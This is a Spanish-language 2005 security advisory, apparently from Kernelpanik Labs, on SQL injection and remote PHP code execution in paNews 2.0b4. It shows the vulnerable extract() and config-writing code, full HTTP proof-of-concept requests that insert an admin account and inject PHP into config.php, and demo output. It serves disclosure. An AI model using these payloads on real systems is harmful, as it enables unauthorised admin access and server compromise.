@@ -1,0 +1,141 @@
+=====================================================
+paNews 2.0b4: SQL Injection and remote code execution
+=====================================================
+FraMe - frame at kernelpanik.org
+http://www.kernelpanik.org
+=====================================================
+
+paNews es un script ligero para la gestión de contenido
+web, principalmente noticias, y weblogs. Usa como sistema
+de backend MySQL y en su versión 2.0 ha sido "re-escrito"
+según aseguran sus autores para eliminar problemas de 
+seguridad. 
+
+paNews permite la inyección de código SQL gracias al uso
+de "extract($_GET)" y "extract($_POST)" los cuales son llamados
+sin ningún control a lo largo del código permitiendo re-escribir
+los valores legítimos de la aplicación, por los nuestros propios.
+
+Haciendo uso de esta vulnerabilidad es posible insertar
+nuestro propio usuario en paNews, y a partir de aquí conseguir
+injección de código, usando variables no saneadas, en la escritura 
+a disco del fichero de configuración "config.php". 
+
+=== Inyección de SQL en el método login();
+=== fichero: ./includes/auth.php
+
+<?
+(..)
+function login() {
+global $error,$mysql_prefix,$_COOKIE,$_SESSION,$_LOGIN,$_GET,
+$_POST,$myip,$authtype;
+			
+extract ($_GET);
+extract ($_POST);
+							
+$username = strtolower($username);
+$password = strtolower($password);
+
+$query = mysql_query("SELECT * FROM `".$mysql_prefix."_auth`");
+
+if (mysql_num_rows($query) == 0) {
+    $pass2 = MD5($password);
+    mysql_query("INSERT INTO `".$mysql_prefix."_auth` 
+    		  VALUES ('','$username','$pass2','',
+		  'admins|cat|comment|newsadd|newsedit|prefset|setup',
+		  '','$myip',UNIX_TIMESTAMP(),UNIX_TIMESTAMP())");
+(..)
+?>
+
+El uso de "extract" permite adulterar la variable $mysql_prefix lo cual
+hace posible insertar un nuevo usuario en el sistema con privilegios
+administrativos.
+
+==== Proof of concept para el método login();
+
+POST http://localhost/panews/index.php HTTP/1.1
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Accept-Encoding: gzip,deflate
+Accept-Language: en-us,en;q=0.5
+Host: localhost
+Referer: http://localhost/panews/index.php
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041111 Firefox/1.0
+Content-Length: 208
+Content-Type: application/x-www-form-urlencoded
+Keep-Alive: 300
+
+action=login&username=frame&password=amo&mysql_prefix=panews_auth` VALUES ("","frame","d41d8cd98f00b204e9800998ecf8427e","hackit","admins|cat|comment|newsadd|newsedit|prefset|setup","none","127.0.0.1",1,1)%00
+
+==== Inyección de código PHP en el admin_setup.php
+==== fichero: ./includes/admin_setup.php
+
+if ($do == "updatesets") {
+        $lang = $form[lang];
+	$comments = $form[comments];
+	$autoapprove = $form[autoapprove];
+			
+	$content = "(..)"
+	. "\$comments = $comments;\r\n"
+	. "\$autoapprove = $autoapprove;\r\n"
+	. "\$showcopy = $showcopy;\r\n"
+	. "\$lang = \"$lang\";\r\n"
+	. "(..)";
+	
+        $config = fopen ("./config.php", "w");
+	$contents2 = fwrite ($config, $content) || $error = $lng["cantupdate"];
+	fclose ($config);
+(..)
+?>
+
+Entre otros los parámetros $comments o $autapprove, no sufren ningún tipo de chequeo,
+pudiendo ser adulterados y permitiendo la inyección de código PHP en el fichero 
+"./config.php"
+
+Esta vulnerabilidad permite ser explotada de al menos dos formas, según en el entorno
+en el que nos encontremos, en la demostración del concepto sólo será mostrada la más
+genérica, y que necesita de un usuario autorizado en el sistema ^^
+
+==== Proof of concept para admin_setup.php
+
+GET http://hawking/panews/index.php?action=admin&op=setup&form[lang]=english&form[comments]=1&form[autoapprove]=1;%20?%3E%20%3C?%20include(%22/var/cpuinfo%22);%20?%3E%20%3C?%20$trivial=1 HTTP/1.1
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Accept-Encoding: gzip,deflate
+Accept-Language: en-us,en;q=0.5
+Host: hawking
+Referer: http://hawking/panews/index.php
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041111 Firefox/1.0
+Cookie: panews=%BF%3F%BF%3F0%BF%3F1108908178%BF%3F%BF%3Fframe%BF%3F0; IS_PANEWS=1
+Keep-Alive: 300
+
+==== Demo: Ejecución de "include /proc/cpuinfo" 
+
+$ links -dump http://localhost/panews/
+processor : 0 vendor_id : GenuineIntel cpu family : 6 model : 13 model
+name : Intel(R) Pentium(R) M processor 1.60GHz stepping : 6 cpu MHz :
+598.614 cache size : 2048 KB fdiv_bug : no hlt_bug : no f00f_bug : no
+coma_bug : no fpu : yes fpu_exception : yes cpuid level : 2 wp : yes flags
+: fpu vme de pse tsc msr mce cx8 mtrr pge mca cmov pat clflush dts acpi
+mmx fxsr sse sse2 ss tm pbe est tm2 bogomips : 1182.72
+		  
+                       Please Login
+                 Username [1]_____________________
+                 Password [2]_____________________
+            		[ Login ]
+
+    		paNews 2.0b4 (c) 2003 phpArena
+
+==== Línea de publicación
+
+No hay línea de publicación.
+
+==== Nota final
+
+register_globals puesto a "off" no elimina esta vulnerabilidad.
+
+================================
+FraMe - frame at kernelpanik.org
+http://www.kernelpanik.org
+2005 (C) Kernelpanik Labs
+================================
